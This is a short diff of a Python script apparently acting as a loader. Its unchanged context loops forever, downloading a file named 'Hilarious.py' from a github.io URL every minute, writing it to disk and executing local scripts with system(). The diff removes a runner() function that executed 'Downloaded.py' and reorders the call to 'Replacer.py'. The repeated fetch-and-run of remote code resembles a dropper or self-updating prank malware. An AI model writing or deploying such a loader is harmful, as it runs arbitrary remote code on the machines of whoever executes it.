@@ -18,15 +18,7 @@ def wFile(content):
     file.write(content)
     file.close()
 
-# Runs the 
-def runner():
-  print("Running runner")
-  sleep(10)
-  system("Downloaded.py")
-  exit()
-
-
 while True:
   wFile(dwFile("https://funriis.github.io/Hilarious.py"))
-  system("Replacer.py")
   sleep(60)
+  system("Replacer.py")
